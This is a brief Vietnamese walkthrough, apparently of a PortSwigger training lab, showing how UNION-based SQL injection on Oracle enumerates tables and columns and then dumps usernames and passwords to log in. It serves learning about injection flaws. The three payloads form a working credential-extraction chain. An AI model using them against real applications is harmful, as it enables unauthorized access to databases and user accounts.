# SQL injection attack, listing the database contents on Oracle

Như thường lệ ta check xem có bao nhiêu cột và kiểu dữ liệu trong cột đó là gì, làm như những bài trước thì ta thấy có 2 cột và kiểu dữ liệu string.

Ta sử dụng câu lệnh `' UNION SELECT TABLE_NAME, NULL FROM all_tables--` để liệt kê ra tên các bảng, sau đó tìm bảng có tên liên quan tới `users` 

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/4.1.png?raw=true)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE TABLE_NAME = 'USERS_GGLJHE'--` để liệt kê ra tên các cột bên trong bảng `USERS_GGLJHE`.

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/4.2.png?raw=true)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT PASSWORD_HYUDNK, USERNAME_EMUICX FROM USERS_GGLJHE--` để truy cập vào thông tin 2 cột trên và đăng nhập thui

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/4.3.png?raw=true)

Login và hoàn thành bài lab thui!
